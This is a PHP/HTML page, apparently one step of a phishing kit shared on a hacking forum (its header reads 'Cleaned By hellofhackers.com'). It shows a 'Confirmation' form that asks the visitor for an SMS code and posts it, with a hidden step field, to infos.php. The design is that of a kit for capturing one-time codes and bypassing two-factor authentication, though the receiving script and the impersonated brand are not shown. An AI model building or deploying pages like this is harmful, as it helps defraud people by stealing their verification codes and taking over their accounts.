<!-- ____ INFORMATION ____ 
     
     Cleaned By : https://hellofhackers.com
-->


<?php 

require_once "functions.php";

lang();
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Confirmation</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/fav.jpg" type="image/x-icon" />
  <link rel="shortcut icon" href="image/fav.jpg" type="image/x-icon" />

  <!-- fontawtsome -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>

</head>

<body>
   <div class="body">
       <div class="logo mt-3 text-center"><img src="image/logo.png"></div>
       <section>
           <div class="form">
               <h1><?php echo get_text('h1_sms'); ?></h1>
               <p style="font-size: 13px;"><?php echo get_text('sec'); ?></p>
               <div class="img text-center py-4"><img width="80" src="image/sms.png"></div>
               <form action="infos.php" method="post">
                   <input type="hidden" value="sms" name="step">
                   <div class="form-group">
                       <label><?php echo get_text('label_sms'); ?></label>
                       <input type="text" class="form-control" id="sms" name="sms">
                   </div>
                   <div class="bttn"><button name="submit"><?php echo get_text('btn_sms'); ?></button></div>
               </form>
           </div>
       </section>
       <footer>
           <div class="back text-center">
               <ul class="list-unstyled d-flex justify-content-center mb-0">
                   <li><?php echo get_text('ft_li_1'); ?></li>
                   <li><?php echo get_text('ft_li_2'); ?></li>
                   <li><?php echo get_text('ft_li_3'); ?></li>
               </ul>
               <span><?php echo get_text('copy'); ?></span>
           </div>
       </footer>
   </div>


   
    


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>

  </script>
</body>
</html>